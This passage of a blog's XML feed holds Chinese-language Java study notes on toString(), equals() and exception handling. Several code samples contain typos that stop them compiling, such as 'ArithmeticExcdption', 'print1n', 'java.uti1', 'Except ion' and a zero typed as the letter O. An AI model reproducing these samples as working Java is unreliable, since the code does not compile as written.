    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 4toString</title>
    <link href="http://example.com/2021/04/15/Java-4toString/"/>
    <id>http://example.com/2021/04/15/Java-4toString/</id>
    <published>2021-04-15T02:19:46.000Z</published>
    <updated>2021-04-20T13:54:43.831Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ToString-方法介绍"><a href="#ToString-方法介绍" class="headerlink" title="ToString()方法介绍"></a>ToString()方法介绍</h1><p>类会自动继承Object，里面的ToString方法会输出 <strong>（类名）@（对象的哈希码）</strong></p><p><img src="/2021/04/15/Java-4toString/%E7%A4%BA%E4%BE%8B1.png"></p><p><strong>@后是对象内存地址的十六进制表示</strong></p><p><strong>ToString里面存有对象信息</strong></p><p>例子：System.out.println(类对象名)；示例1</p><p>未重写ToString方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestToString</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">A aa = <span class="keyword">new</span> A();</span><br><span class="line">System.out.println(aa);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">__________________________________________________</span><br><span class="line">输出结果</span><br><span class="line">    A<span class="meta">@de6ced</span></span><br></pre></td></tr></table></figure><p>重写ToSrting方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">return</span><span class="string">&quot;哈哈&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestToString</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        A aa = <span class="keyword">new</span> A();</span><br><span class="line">        System.out.println(aa);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">________________________________________________</span><br><span class="line">    输出结果</span><br><span class="line">    哈哈</span><br></pre></td></tr></table></figure><h1 id="toString方法总结"><a href="#toString方法总结" class="headerlink" title="toString方法总结"></a>toString方法总结</h1><ul><li>所有的类都默认自动继承了Object类</li><li>Object类中的toString方法返回的是<strong>类的名字和该对象哈希吗组成</strong>的一个字符串-</li><li>system.out.printIn(类对对象);<pre><code>   实际输出的是该对象的toString()方法所返回的字符串</code></pre></li><li>为了实际需要，建议子类重写从父类Object继承的toString方法</li></ul><h1 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h1><p>String类，处理字符串</p><p>String类中的Equals方法是比较字符串方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A aa1 &#x3D; new A(2);</span><br><span class="line">A aa2 &#x3D; new A(2);</span><br></pre></td></tr></table></figure><p>aa1 和 aa2 里面存储的是内存地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println( aa1.equals(aa2) ); &#x2F;&#x2F;相互比较</span><br></pre></td></tr></table></figure><p>Obj的equals认为值虽然一样但内存地址不一样输出falst</p><p>容器 List 和 set 不允许存储相同元素就需要重写equals</p><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//if(当前对象的i和obj代表的i相等)</span></span><br><span class="line">        <span class="comment">//if(this.i == obj.i) //Obj.i 这么写是错误的，父类的引用不能调用子类特有的成员</span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//正确</span></span><br><span class="line">        A aa = (A)Obj;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.i ==aa.i)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestStringEquals_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        aa1 = <span class="keyword">new</span> A(<span class="number">2</span>);</span><br><span class="line">    aa2 = <span class="keyword">new</span> A(<span class="number">2</span>);</span><br><span class="line">    System.out.print1n( aa1.equals(aa2) );<span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Object类的equals方法"><a href="#Object类的equals方法" class="headerlink" title="Object类的equals方法"></a>Object类的equals方法</h1><ul><li>所有类都从Object类中继承了equlas方法o</li><li>bject类中equals方法源代码如下:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span> == obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Object中的equals方法是直接判断this和obj本身的值是否相等，即用来判断调用equals的对象和形参obj所引用的对象是否是同一对象，所谓同一对象就是指是内存中同一块存储单元，如果this和obj指向的是同一块内存对象，则返回true，如果this和obj指向的不是同一块内存，则返回false,注意：<strong>即便是内容完全相等的两块不同的内存对象，也会返回false</strong></li><li><strong>如果是同一块内存，则Object中的equals方法返回true。如果是不同的内存，则返回false</strong></li></ul><h1 id="何时需要重写euqals方法"><a href="#何时需要重写euqals方法" class="headerlink" title="何时需要重写euqals方法"></a>何时需要重写euqals方法</h1><ul><li>用一个类构造出来的不同内存的两个对象，如果内存中的值相等，我们一般情况下也应该认为这两个对象相等，很明显Object中的equals()无法完成这样的重任，Object中的<br>equals()方法只有在两个对象是同一块内存时，才返回true,这时候我们就有必要重写父类Object中的equals方法</li><li>如果希望<strong>不同内存但相同内容的两个对象equals时返回true</strong>，则我们需要重写父类的equals方法</li></ul><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">A</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.i = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        A aa1 = <span class="keyword">new</span> A(<span class="number">1</span>);</span><br><span class="line">        A aa2 = <span class="keyword">new</span> A(<span class="number">1</span>);</span><br><span class="line">        System.out.println(aa1 == aa2);</span><br><span class="line">        system.out.println(aa1.equals(aa2));   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">___________________________</span><br><span class="line">    输出结果</span><br><span class="line">    <span class="keyword">false</span></span><br><span class="line">    <span class="keyword">false</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ToString-方法介绍&quot;&gt;&lt;a href=&quot;#ToString-方法介绍&quot; class=&quot;headerlink&quot; title=&quot;ToString()方法介绍&quot;&gt;&lt;/a&gt;ToString()方法介绍&lt;/h1&gt;&lt;p&gt;类会自动继承Object，里面的ToString</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 3异常</title>
    <link href="http://example.com/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/"/>
    <id>http://example.com/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/</id>
    <published>2021-04-12T07:04:40.000Z</published>
    <updated>2021-04-20T13:54:31.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="异常-try-…-catch"><a href="#异常-try-…-catch" class="headerlink" title="异常 try … catch"></a>异常 try … catch</h1><p><strong>异常（exception）不是编译错误，是运行错误，编译错误是error，异常是一个对象</strong></p><p>异常(Exception)是程序运行过程中发生的事件，该事件可以中断程序指令的正常执行流程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestExcep_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">A aa = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">aa.divide(<span class="number">6</span>,O); <span class="comment">//可能错误的代码</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">catch</span>(ArithmeticExcdption e) <span class="comment">//抓取的异常，e用来接收23行抛出的异常对象，e是接受异常的对象</span></span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace(); <span class="comment">//可以简单理解为输出该异常的具体信息</span></span><br><span class="line">System.out.printf(<span class="string">&quot;除零错误，你的程序出错啦!除数不能为零，嘿&quot;</span>);</span><br><span class="line"><span class="comment">//应该怎么做</span></span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">System.out.printf(<span class="string">&quot;今天我很高心，因为我和世界的关系和和谐!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>只有放进try才会被捕抓到，程序不会连着抛两个异常</strong></p><h1 id="异常的分类"><a href="#异常的分类" class="headerlink" title="异常的分类"></a>异常的分类</h1><p><img src="/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/%E5%BC%82%E5%B8%B8%E5%88%86%E7%B1%BB.png"></p><ol><li>Error是系统错误，程序员无法处理这些异常</li><li>Exception是程序员可以捕获并处理的异常</li><li>RuntimeException的子类异常是你可以处理也可以不处理的异常</li><li>凡是继承自Exception但又不是 RuntimeException子类的异常我们都必须的捕捉并进行处理</li><li>不知道异常的名字，可以写Exception ，因为它是所有的异常的父类</li></ol><p><strong>注意：</strong></p><p>​    Java认为放在try里的代码可能不会执行成功，所以m不会赋值成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="title">Excep_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">m=<span class="number">2</span>;</span><br><span class="line">System.out.printf(<span class="string">&quot;m = %d\n&quot;</span>, m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Except ion e)</span><br><span class="line">        &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        Systcem.out.printf(<span class="string">&quot;m = %d\n&quot;</span>, m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Error:<br>由Java虚拟机生成并抛出，包括动态链接失败、虚拟机错误等，<strong>Java程序无法对此错误进行处理。</strong></li><li>Runtime Exception:（可不抓也可不抓）<br>.Java虚拟机在运行时生成的异常，如被0除等系统错误、数组下标超范围等，<strong>其产生比较频繁，处理麻烦，对程序可读性和运行效率影响太大</strong>天。因此由系统检测，用户可不做处理，系统将它们交给缺省的异常处理程序（当然，必要时,用户可对其处理)。</li><li>Exception:<br>一般程序中可预知的问题，其产生的异常可能会带来意想不到的结果，因此<strong>Java编译器要求Java程序必须捕获或声明所有的非运行时异常</strong></li></ul><h1 id="为什么需要异常"><a href="#为什么需要异常" class="headerlink" title="为什么需要异常"></a>为什么需要异常</h1><p>例子：从键盘输入整数，不能使用if……else处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.uti1.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestExcep_3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in); <span class="comment">//System.in 表示键盘 </span></span><br><span class="line">        i = sc.nextInt();</span><br><span class="line">System.out.printf(<span class="string">&quot;i= %d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例1：编程实现把键盘输入的数字赋给整型变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInput_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> i = sc.nextilst();</span><br><span class="line">System.out.println(<span class="string">&quot;i= &quot;</span> + i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果输入的不是合法数字运行结果如下:</p><p><img src="/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/%E6%8A%A5%E9%94%99.png"></p><h2 id="读写错误异常-的处理"><a href="#读写错误异常-的处理" class="headerlink" title="读写错误异常 的处理"></a>读写错误异常 的处理</h2><p>​    本程序出现的问题是无法通过逻辑判断来解决的，Java提供的异常处理机制可以很好的解决这个问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInput</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">Scanner sc = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> i = sc.nextInt();</span><br><span class="line">System.out.printf(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">catch</span> (InputMismatchException e)</span><br><span class="line">    &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;读取错误，程序将终止&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="异常的处理机制-重点"><a href="#异常的处理机制-重点" class="headerlink" title="异常的处理机制(重点)"></a>异常的处理机制(重点)</h1><ul><li>当Java程序运行时出现问题时，系统会自动检测到该错误，并立即生成一个与该错误对应的异常对象</li><li>然后把该异常对象提交给Java虚拟机</li><li>Java虚拟机会自动寻找相应的处理代码来处理这个异常，如果没有找到，则由Java虚拟机做一些简单的处理后，程序被强行终止！</li><li>程序员可以自己编写代码来捕捉可能出现的异常，并编写代码来处理相应的异常</li></ul><h3 id="printStackTrace方法-输出异常信息"><a href="#printStackTrace方法-输出异常信息" class="headerlink" title="printStackTrace方法 输出异常信息"></a>printStackTrace方法 输出异常信息</h3><h2 id="可处理可不处理的异常-和-必须得进行处理的异常"><a href="#可处理可不处理的异常-和-必须得进行处理的异常" class="headerlink" title="可处理可不处理的异常 和 必须得进行处理的异常"></a>可处理可不处理的异常 和 必须得进行处理的异常</h2><h3 id="常见异常之空指针异常"><a href="#常见异常之空指针异常" class="headerlink" title="常见异常之空指针异常"></a>常见异常之空指针异常</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestNullPointerException</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">Person p = <span class="keyword">null</span>;</span><br><span class="line">System.out.printin(p.age);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C1.png"></p><h3 id="常见异常之下标越界异常"><a href="#常见异常之下标越界异常" class="headerlink" title="常见异常之下标越界异常"></a>常见异常之下标越界异常</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestlndexOutof</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">String friends[]=&#123;<span class="string">&quot;Lisa&quot;</span>,<span class="string">&quot;Bily&quot;</span>,<span class="string">&quot;Kessy&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">System.out.println(friends[i]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;\nthis is the end&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C2.png"></p><h1 id="处理异常的两种方式"><a href="#处理异常的两种方式" class="headerlink" title="处理异常的两种方式"></a>处理异常的两种方式</h1><h2 id="第一种-throw抛出"><a href="#第一种-throw抛出" class="headerlink" title="第一种 throw抛出"></a>第一种 throw抛出</h2><p>有些异常不处理编译会抛出，f()没有对异常进行处理，交给被调用者处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//public void f()</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//throw new IOException(); //throw 抛出异常，交给mian处理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ArithmeticException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestExcep_5</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="comment">//throws IOException</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        A aa = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">aa.f();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (IOException e)</span><br><span class="line">        &#123;   </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>throw将异常抛出函数不处理</strong></p><h2 id="第二种本函数处理"><a href="#第二种本函数处理" class="headerlink" title="第二种本函数处理"></a>第二种本函数处理</h2><h1 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h1><h2 id="异常处理步骤"><a href="#异常处理步骤" class="headerlink" title="异常处理步骤"></a>异常处理步骤</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">可能出现异常的代码块</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ExceptionName1 e)</span><br><span class="line">&#123;</span><br><span class="line">当产生ExceptionName1异常时的处理措施</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ExceptionName2 e)</span><br><span class="line">&#123;</span><br><span class="line">当产生ExceptionName2异常时的处理措施</span><br><span class="line">&#125;</span><br><span class="line">........</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">无论是否捕捉到异常都必须处理的代码</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Finally的作用"><a href="#Finally的作用" class="headerlink" title="Finally的作用"></a>Finally的作用</h2><ul><li>无论try所指定的程序块中是否抛出异常，也无论catch语句的异常类型是否与所抛弃的异常的类型一致，<strong>finally中的代码一定会得到执行</strong></li><li>finally语句为异常处理提供一个统一的出口，使得在控制流程转到程序的其他部分以前，<strong>能够对程序的状态作统一的管理</strong></li><li>通常在finally语句中可以<strong>进行资源的清除工作，如关闭打开的文件、删除临时文件等</strong></li></ul><h1 id="自定义异常-和-throws常见错误解析"><a href="#自定义异常-和-throws常见错误解析" class="headerlink" title="自定义异常 和 throws常见错误解析"></a>自定义异常 和 throws常见错误解析</h1><h2 id="throw"><a href="#throw" class="headerlink" title="throw"></a>throw</h2><ul><li><p>throw用来抛出异常</p></li><li><p>格式：<br>throw new异常名(参数);</p></li><li><p>假设f方法抛出了A异常，则f方法有两种方式来处理A异常</p><ul><li><ol><li>throws A<br> 谁调用f方法，谁处理A异常，f方法本身不处理A异常</li><li>try{ ..….} catch () { …..….}<br> f方法本身自己来处理A异常</li></ol></li></ul></li><li><p><strong>要抛出的异常必须得是Throwable的子类</strong></p></li></ul><p>自定义异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 